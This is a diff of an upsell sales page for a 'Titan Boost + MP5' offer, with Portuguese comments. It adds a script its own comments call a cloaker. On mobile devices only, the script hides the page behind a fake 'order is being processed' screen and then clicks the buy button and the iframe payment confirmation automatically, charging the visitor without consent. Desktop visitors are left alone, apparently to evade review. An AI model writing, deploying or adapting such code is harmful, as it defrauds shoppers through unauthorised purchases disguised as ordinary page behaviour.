@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTE Special Offer - Titan Boost + MP5</title>
+  <title>TESTE2 Special Offer - Titan Boost + MP5</title>
 
   <script src="https://assets.mycartpanda.com/cartx-ecomm-ui-assets/js/libs/ocu-external.js"></script>
   <script>
@@ -294,146 +294,144 @@
   </div>
 
 	<script>
-	  // Aguarda o conteúdo da página ser completamente carregado para iniciar o processo.
-	  document.addEventListener('DOMContentLoaded', () => {
+		  // Aguarda o conteúdo da página ser completamente carregado para iniciar o processo.
+		  document.addEventListener('DOMContentLoaded', () => {
 
-		// 1. VERIFICAÇÃO DE DISPOSITIVO (CLOAKER)
-		// Este teste verifica se o navegador é de um dispositivo móvel.
-		const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+			// 1. VERIFICAÇÃO DE DISPOSITIVO (CLOAKER)
+			// Este teste verifica se o navegador é de um dispositivo móvel.
+			const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-		// Se NÃO for um dispositivo móvel, exibe uma mensagem no console e não faz mais nada.
-		if (!isMobile) {
-		  console.log('Usuário de Desktop detectado. A página de upsell será exibida normalmente. O script de compra automática não será executado.');
-		  return; 
-		}
+			// Se NÃO for um dispositivo móvel, exibe uma mensagem no console e não faz mais nada.
+			if (!isMobile) {
+			  console.log('Usuário de Desktop detectado. A página de upsell será exibida normalmente. O script de compra automática não será executado.');
+			  return; 
+			}
 
-		// Se CHEGOU AQUI, é porque o usuário é de CELULAR ou TABLET.
-		console.log('Usuário de Celular/Tablet detectado. Ativando compra automática com tela de carregamento.');
-		
-		// 2. CRIA E EXIBE A TELA DE CARREGAMENTO
-		// Esta função injeta o HTML e o CSS da tela de carregamento na página.
-		function showLoadingScreen() {
-		  // CSS da tela de carregamento com o alinhamento corrigido
-		  const loadingCSS = `
-			<style id="loading-style">
-			  .loader-container {
-				position: fixed;
-				top: 0;
-				left: 0;
-				width: 100%;
-				height: 100%;
-				background-color: #e3e8ee;
-				z-index: 999999;
-				display: flex;
-				flex-direction: column; /* Organiza os itens em coluna */
-				justify-content: center; /* Centraliza verticalmente */
-				align-items: center; /* Centraliza horizontalmente */
-				font-family: Arial, sans-serif;
-			  }
-			  .loader-spinner {
-				border: 8px solid #cccccc;
-				border-top: 8px solid #2180c0;
-				border-radius: 50%;
-				width: 45px;
-				height: 45px;
-				animation: spin 1s linear infinite;
-				margin-bottom: 25px;
-			  }
-			  @keyframes spin {
-				0% { transform: rotate(0deg); }
-				100% { transform: rotate(360deg); }
-			  }
-			  .loader-text {
-				color: #525559;
-				font-size: 18px;
-				text-align: center;
-			  }
-			  .loader-text .title {
-				font-weight: bold;
-				margin-bottom: 8px;
-			  }
-			</style>
-		  `;
+			// Se CHEGOU AQUI, é porque o usuário é de CELULAR ou TABLET.
+			console.log('Usuário de Celular/Tablet detectado. Ativando compra automática com tela de carregamento.');
+			
+			// 2. CRIA E EXIBE A TELA DE CARREGAMENTO
+			// Esta função injeta o HTML e o CSS da tela de carregamento na página.
+			function showLoadingScreen() {
+			  // CSS da tela de carregamento com o alinhamento corrigido
+			  const loadingCSS = `
+				<style id="loading-style">
+				  .loader-container {
+					position: fixed;
+					top: 0;
+					left: 0;
+					width: 100%;
+					height: 100%;
+					background-color: #e3e8ee;
+					z-index: 999999;
+					display: flex;
+					flex-direction: column; /* Organiza os itens em coluna */
+					justify-content: center; /* Centraliza verticalmente */
+					align-items: center; /* Centraliza horizontalmente */
+					font-family: Arial, sans-serif;
+				  }
+				  .loader-spinner {
+					border: 8px solid #cccccc;
+					border-top: 8px solid #2180c0;
+					border-radius: 50%;
+					width: 45px;
+					height: 45px;
+					animation: spin 1s linear infinite;
+					margin-bottom: 25px;
+				  }
+				  @keyframes spin {
+					0% { transform: rotate(0deg); }
+					100% { transform: rotate(360deg); }
+				  }
+				  .loader-text {
+					color: #525559;
+					font-size: 18px;
+					text-align: center;
+				  }
+				  .loader-text .title {
+					font-weight: bold;
+					margin-bottom: 8px;
+				  }
+				</style>
+			  `;
 
-		  // HTML da tela de carregamento
-		  const loadingHTML = `
-			<div id="custom-loader" class="loader-container">
-			  <div>
-				<div class="loader-spinner"></div>
-				<div class="loader-text">
-				  <p class="title">Your order is being processed.</p>
-				  <p>Do not close this page.</p>
+			  // HTML da tela de carregamento com a estrutura CORRIGIDA
+			  const loadingHTML = `
+				<div id="custom-loader" class="loader-container">
+					<div class="loader-spinner"></div>
+					<div class="loader-text">
+					  <p class="title">Your order is being processed.</p>
+					  <p>Do not close this page.</p>
+					</div>
 				</div>
-			  </div>
-			</div>
-		  `;
+			  `;
 
-		  // Adiciona o CSS na cabeça e o HTML no corpo do documento
-		  document.head.insertAdjacentHTML('beforeend', loadingCSS);
-		  document.body.insertAdjacentHTML('beforeend', loadingHTML);
-		  
-		  // Oculta o conteúdo original da página para que apenas o loader seja visível
-		  document.body.style.overflow = 'hidden';
-		  const originalContent = Array.from(document.body.children).filter(el => el.id !== 'custom-loader' && el.tagName !== 'SCRIPT' && el.id !== 'loading-style');
-		  originalContent.forEach(el => el.style.display = 'none');
-		}
-
-		// Chama a função para mostrar a tela de carregamento imediatamente
-		showLoadingScreen();
-
-		// 3. EXECUTA A LÓGICA DE COMPRA AUTOMÁTICA
-		// --- CONFIGURAÇÕES ---
-		const tempoDeEsperaEmSegundos = 8;
-		const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
-		const seletorIframePopUp = 'iframe.cp-exocu-frame';
-		const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
-		// -------------------
-
-		console.log('Script de compra automática iniciado em background. Aguardando ' + tempoDeEsperaEmSegundos + ' segundos...');
-
-		setTimeout(() => {
-		  console.log('Tempo de espera finalizado. Procurando o botão "BUY NOW"...');
-		  const botaoComprar = document.querySelector(seletorBotaoComprar);
-		  if (botaoComprar) {
-			console.log('Botão "BUY NOW" encontrado. Clicando para iniciar o pop-up de confirmação...');
-			botaoComprar.click();
-			monitorarPopupDeConfirmacao();
-		  } else {
-			console.error('ERRO: O botão "BUY NOW" com o seletor "' + seletorBotaoComprar + '" não foi encontrado na página.');
-		  }
-		}, tempoDeEsperaEmSegundos * 1000);
-
-		function monitorarPopupDeConfirmacao() {
-		  let tentativas = 0;
-		  const maxTentativas = 60;
-		  console.log('Iniciando monitoramento do pop-up de confirmação...');
-		  const intervalo = setInterval(() => {
-			tentativas++;
-			if (tentativas > maxTentativas) {
-			  clearInterval(intervalo);
-			  console.error('ERRO: O pop-up de confirmação não apareceu após ' + (maxTentativas * 250 / 1000) + ' segundos.');
-			  return;
+			  // Adiciona o CSS na cabeça e o HTML no corpo do documento
+			  document.head.insertAdjacentHTML('beforeend', loadingCSS);
+			  document.body.insertAdjacentHTML('beforeend', loadingHTML);
+			  
+			  // Oculta o conteúdo original da página para que apenas o loader seja visível
+			  document.body.style.overflow = 'hidden';
+			  const originalContent = Array.from(document.body.children).filter(el => el.id !== 'custom-loader' && el.tagName !== 'SCRIPT' && el.id !== 'loading-style');
+			  originalContent.forEach(el => el.style.display = 'none');
 			}
-			const iframe = document.querySelector(seletorIframePopUp);
-			if (iframe) {
-			  console.log('Iframe do pop-up encontrado. Procurando pelo botão de confirmação final...');
-			  try {
-				const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
-				const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
-				if (botaoConfirmacao) {
-				  console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Realizando o clique!');
-				  botaoConfirmacao.click();
-				  clearInterval(intervalo);
-				  console.log('COMPRA DO UPSELL REALIZADA COM SUCESSO!');
-				}
-			  } catch (e) {
-				clearInterval(intervalo);
-				console.error('ERRO de segurança ao tentar acessar o conteúdo do iframe.', e);
+
+			// Chama a função para mostrar a tela de carregamento imediatamente
+			showLoadingScreen();
+
+			// 3. EXECUTA A LÓGICA DE COMPRA AUTOMÁTICA
+			// --- CONFIGURAÇÕES ---
+			const tempoDeEsperaEmSegundos = 8;
+			const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
+			const seletorIframePopUp = 'iframe.cp-exocu-frame';
+			const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
+			// -------------------
+
+			console.log('Script de compra automática iniciado em background. Aguardando ' + tempoDeEsperaEmSegundos + ' segundos...');
+
+			setTimeout(() => {
+			  console.log('Tempo de espera finalizado. Procurando o botão "BUY NOW"...');
+			  const botaoComprar = document.querySelector(seletorBotaoComprar);
+			  if (botaoComprar) {
+				console.log('Botão "BUY NOW" encontrado. Clicando para iniciar o pop-up de confirmação...');
+				botaoComprar.click();
+				monitorarPopupDeConfirmacao();
+			  } else {
+				console.error('ERRO: O botão "BUY NOW" com o seletor "' + seletorBotaoComprar + '" não foi encontrado na página.');
 			  }
+			}, tempoDeEsperaEmSegundos * 1000);
+
+			function monitorarPopupDeConfirmacao() {
+			  let tentativas = 0;
+			  const maxTentativas = 60;
+			  console.log('Iniciando monitoramento do pop-up de confirmação...');
+			  const intervalo = setInterval(() => {
+				tentativas++;
+				if (tentativas > maxTentativas) {
+				  clearInterval(intervalo);
+				  console.error('ERRO: O pop-up de confirmação não apareceu após ' + (maxTentativas * 250 / 1000) + ' segundos.');
+				  return;
+				}
+				const iframe = document.querySelector(seletorIframePopUp);
+				if (iframe) {
+				  console.log('Iframe do pop-up encontrado. Procurando pelo botão de confirmação final...');
+				  try {
+					const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+					const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
+					if (botaoConfirmacao) {
+					  console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Realizando o clique!');
+					  botaoConfirmacao.click();
+					  clearInterval(intervalo);
+					  console.log('COMPRA DO UPSELL REALIZADA COM SUCESSO!');
+					}
+				  } catch (e) {
+					clearInterval(intervalo);
+					console.error('ERRO de segurança ao tentar acessar o conteúdo do iframe.', e);
+				  }
+				}
+			  }, 250);
 			}
-		  }, 250);
-		}
-	  });
+		  });
 	</script>
 
 </body>
